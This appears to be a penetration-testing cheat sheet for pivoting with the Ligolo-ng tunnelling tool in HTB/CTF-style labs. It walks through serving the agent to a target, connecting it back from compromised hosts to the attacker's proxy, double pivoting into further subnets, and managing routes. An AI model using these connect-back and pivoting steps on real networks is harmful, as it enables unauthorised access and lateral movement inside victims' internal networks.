---
icon: diagram-project
---

# LIGOLO

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

## Resolve Error of Listner

***

<pre><code>┌──[::IP::10.10.16.8]─[sn0x@sharma]─[~] 1
└──╼ ཀ $ sudo lsof -i :11601                                                                                                                             
[sudo] password for off-hacker: 
COMMAND    PID USER FD   TYPE DEVICE SIZE/OFF NODE NAME
proxy   110838 root 3u  IPv6 393192      0t0  TCP *:11601 (LISTEN)
proxy   110838 root 7u  IPv6 374598      0t0  TCP blackraven:11601->trilocor.local:51250 (ESTABLISHED)

┌──[::IP::10.10.16.8]─[off-hacker@blackraven]─[~] 
<strong>└──╼ ཀ $ sudo kill -9 110838
</strong></code></pre>

## Download Essentials

***

```bash
# Agent
wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip> -O ligolo-ng_agent_0.8.2_windows_amd64.zip

# Proxy
wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz> -O ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Updog command
sudo pacman -S python-updog
```

## Use updog to share the `agent.exe` file

***

```bash
# On the attacker's box
updog -p 8080
```

## Adding up our interface

***

```bash
sudo ip tuntap add user root mode tun ligolo  # adding interface 
sudo ip link set ligolo up                    # starting interface
sudo ip route list                            # checking route
sudo ip link delete ligolo                    # to delete interface
```

## Strating our proxy

***

```bash
  △   △
╭─ ◕‿◕ [ 10.10.16.112 ] 𖤍 [ ~/Tools/Windows-Tools/Ligolo] git:(main*)  
└─❥ ./proxy -selfcert                                                                                                                         [0]
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \\/ / __ \\______/ __ \\/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\\__, /\\____/_/\\____/     /_/ /_/\\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » 
```

## On the target host

***

```bash
# Send out agent on target
# Start Ligolo agent
./agent  --connect 10.10.14.14:11601 -ignore-cert -retry
```

## Start your sessions

***

```bash
# List your session
ligolo-ng » session

# Select session
ligolo-ng » 1

# Start your session
ligolo-ng » start

# ifconfig
ligolo-ng » ifconfig
```

## Add your route for the target network

***

```bash
sudo ip route add 172.16.8.0/24 dev ligolo
```

## Delete the Interface if problem w/ Traffic

***

```powershell
sudo ip route del 192.168.98.0/24 dev tun0
```

## Double Pivot

***

### Add another logical Interface

***

```bash
# Add another logical interface

sudo ip tuntap add user root mode tun ligolo-double  # adding interface 
sudo ip link set ligolo-double up                    # starting interface
sudo ip route list                                   # checking route
```

### Add a listener in Ligolo

***

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
ligolo-ng » listener_list
```

### On the victim’s side

***

```bash
.\\agent.exe -connect 172.16.139.10:11601 -ignore-cert -retry
```

### Start the tunnel after the connection

***

```bash
# Starting our tunnel for the second interface (ligolo-double)
tunnel_start --tun ligolo-double
```

### Add the route to the next subnet

***

```bash
sudo ip route add 172.16.6.0/24 dev ligolo-double
```

## IP Route Management

### **View Current Routes**

```bash
ip route list
ip route show
ip r  # Short form
route -n  # Alternative (older style)
```

***

### **Add Specific Route**

```bash
# Basic syntax
sudo ip route add <network> dev <interface>
sudo ip route add <network> via <gateway> dev <interface>

# Examples
sudo ip route add 172.16.5.0/24 dev pivotl
sudo ip route add 10.10.10.0/24 via 10.10.14.1 dev tun0
sudo ip route add 192.168.1.0/24 via 10.10.14.50 dev tun0
```

***

### **Delete Specific Route**

```bash
# Single route delete
sudo ip route del <network> dev <interface>

# Examples
sudo ip route del 172.16.5.0/24 dev pivotl
sudo ip route del 192.168.29.0/24 dev wlan0
sudo ip route del 10.10.10.0/23 via 10.10.14.1 dev tun0
```

***

### **Delete All Custom Routes (Clean Reset)**

```bash
# Method 1: Delete each route manually
sudo ip route del 10.10.10.0/23 via 10.10.14.1 dev tun0
sudo ip route del 10.10.14.0/23 dev tun0
sudo ip route del 10.129.0.0/16 dev tun0
sudo ip route del 172.16.5.0/24 dev pivotl
sudo ip route del 172.16.6.0/24 dev pivotl
sudo ip route del 172.17.0.0/16 dev docker0

# Method 2: Flush all routes for specific interface
sudo ip route flush dev tun0
sudo ip route flush dev pivotl
sudo ip route flush dev docker0

# Method 3: Flush entire routing table (DANGEROUS - will break network!)
sudo ip route flush table main  # Don't use unless you know what you're doing
```

***

### **Restart Network Interface (Fresh Start)**

```bash
# Restart VPN/Tunnel interface
sudo ip link set tun0 down
sudo ip link set tun0 up

# For any interface
sudo ip link set <interface> down
sudo ip link set <interface> up

# Or reconnect VPN from scratch
sudo openvpn --config lab.ovpn  # Reconnect VPN
```

***

### **Network Service Restart**

```bash
# Ubuntu/Debian
sudo systemctl restart networking
sudo systemctl restart NetworkManager

# Arch/Parrot
sudo systemctl restart NetworkManager

# Flush DNS cache too (if needed)
sudo systemd-resolve --flush-caches
```

***

### **Quick Commands for Your Scenario**

```bash
# 1. Delete all pivot routes
sudo ip route flush dev pivotl

# 2. Delete VPN routes
sudo ip route flush dev tun0

# 3. Reconnect VPN fresh
sudo openvpn --config academy.ovpn

# 4. Verify clean state
ip route list
```

***

### **Understanding Route Components**

```bash
10.10.10.0/23 via 10.10.14.1 dev tun0
│             │              │
│             │              └─ Interface to use
│             └─ Gateway IP (next hop)
└─ Destination network
```

***

### **Common Use Cases**

#### **HTB/CTF VPN Reset**

```bash
# Kill old VPN
sudo killall openvpn

# Clear old routes
sudo ip route flush dev tun0

# Reconnect fresh
sudo openvpn --config academy.ovpn
```

#### **Pivoting Cleanup**

```bash
# Remove all pivot routes
sudo ip route flush dev pivotl

# Remove interface
sudo ip link del pivotl
```
